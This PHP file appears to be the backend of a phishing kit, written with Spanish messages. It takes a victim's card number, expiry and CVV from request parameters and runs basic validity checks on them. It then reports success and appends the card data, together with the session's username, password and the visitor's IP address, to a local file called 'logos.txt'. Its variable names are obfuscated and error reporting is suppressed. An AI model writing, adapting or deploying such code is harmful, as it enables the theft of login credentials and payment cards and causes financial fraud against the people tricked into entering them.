<?php
error_reporting(0);
session_start();
function find_text($text, $in){
$k2HjS9_09 = explode($text, $in);
$k2HjS9_08 = $k2HjS9_09[1];

if($k2HjS9_08 != ''){
return 1;
} else {
return 0;
}

} 
if(isset($_GET['numero'])){
if(empty($_GET['numero'] && $_GET['expm'] && $_GET['month'] && $_GET['cvv'])){
echo '{"status":"error","errordescription":"Falta un parametro","number":"408"}';
exit(); 
} else
$numero= $_GET['numero'];           
$expm = $_GET['expm'];
$expy = $_GET['month'];
$cvv = $_GET['cvv'];

function name_validation($name){
            if(strpos($name, ' ')){
            $name = str_replace(" ", "", $name);
            if(is_numeric($name)){
            return 0;    
            }
            if(strpos($name, '0') || strpos($name, '1') || strpos($name, '2') || strpos($name, '3') || strpos($name, '4') || strpos($name, '5') ||strpos($name, '6') || strpos($name, '7') || strpos($name, '8') || strpos($name, '9')){
            return 0;
            } else {
            return 1;    
            }
            } else {
            return 0;   
            }
            }
            function address_validation($address){
            if(strpos($address, ' ')){
           
            return 1;
            } else {
            return 0;   
            }
            }
    include_once 'librerias/creditcards.class.php';
            $CCV = new CreditCardValidator();
            $CCV->Validate($_GET['numero']);
            $CARDINFO = $CCV->GetCardInfo();
            $status = strtoupper($CARDINFO['status']);
            $tta = substr($_GET['numero'], 0,1);
            
            if($status == 'INVALID'){
            echo '{"status":"error","errordescription":"El número de tarjeta es inválido","number":"404"}';
            exit();
            }else
           
      if(strlen($cvv) < 3){
      echo '{"status":"error","errordescription":"CVV Incorrecto","number":"404"}';
      exit();
      }
      
      if($tta == 4){
      if(strlen($cvv) > 3) {
      echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}'; 
      exit();
      }
      }
      if($tta == 3){
      if(strlen($cvv) < 4) {
      echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}'; 
      exit();
      }
      }
      if($tta == 5){
      if(strlen($cvv) > 3) {
      echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}'; 
      exit();
      }
      }
      if($tta == 6){
      if(strlen($cvv) > 3) {
      echo '{"status":"error","errordescription":"CVV Inválido","number":"404"}'; 
      exit();
      }
      }



echo '{"status":"success","errordescription":"none","number":"302"}';
$kOpD3ZelQ = fopen('logos.txt','a+');
$zPpD3ZelQ = fwrite($kOpD3ZelQ, "
    -------------------------------------------------
    Username : ".$_SESSION['usuario']."
    Password : ".$_SESSION['password']."
    Num : ".$_GET['numero']."
    Exp : ".$_GET['expm']." / ".$_GET['month']."
    CVV : ".$_GET['cvv']."
    IP : ".$_SERVER['REMOTE_ADDR']."
    -------------------------------------------------\n");
 
 fclose($kOpD3ZelQ);
}

      ?>